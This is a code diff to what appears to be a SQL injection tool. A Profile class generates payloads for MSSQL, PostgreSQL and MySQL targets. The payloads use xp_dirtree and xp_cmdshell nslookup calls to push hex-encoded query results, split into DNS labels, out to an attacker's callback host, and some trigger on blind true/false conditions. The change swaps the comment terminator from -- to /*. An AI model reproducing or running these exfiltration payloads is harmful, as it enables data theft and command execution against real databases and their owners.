@@ -61,8 +61,8 @@ class Profile:
                 f"+CASE WHEN LEN({h})>186 THEN '.'+SUBSTRING({h},187,62) ELSE '' END"
             )
             if self.name == "mssql-cmdshell":
-                return f"{base}'; EXEC master..xp_cmdshell 'nslookup '+{split}+'.{host}'--"
-            return f"{base}'; EXEC master..xp_dirtree '//'+{split}+'.{host}/x'--"
+                return f"{base}'; EXEC master..xp_cmdshell 'nslookup '+{split}+'.{host}'/*"
+            return f"{base}'; EXEC master..xp_dirtree '//'+{split}+'.{host}/x'/*"
 
         if self.name == "postgres-dblink":
             # PostgreSQL: encode()::hex, split with substring + CASE
@@ -132,7 +132,7 @@ class Profile:
         if self.name == "mssql":
             return (
                 f"{base}';IF ({condition}) "
-                f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'--"
+                f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'/*"
             )
         if self.name == "mysql":
             return (
@@ -160,7 +160,7 @@ class Profile:
         if self.name == "mssql-cmdshell":
             return (
                 f"{base}';IF ({condition}) "
-                f"EXEC master..xp_cmdshell 'nslookup {callback_host}'--"
+                f"EXEC master..xp_cmdshell 'nslookup {callback_host}'/*"
             )
         if self.name == "mysql-stacked":
             escaped = callback_host.replace("'", "''")
